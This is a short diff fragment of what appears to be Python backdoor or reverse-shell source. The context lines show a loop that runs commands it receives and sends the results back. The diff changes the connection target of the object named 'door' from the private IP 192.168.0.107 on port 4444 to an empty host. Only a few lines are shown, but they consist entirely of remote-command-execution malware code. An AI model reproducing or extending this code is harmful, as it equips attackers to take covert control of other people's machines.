@@ -66,5 +66,5 @@ class Main:
                 result = self.cmd(" ".join(command))
             self.reliable_send(result)
 
-door = Main("192.168.0.107", 4444)
+door = Main("", 4444)
 door.run()
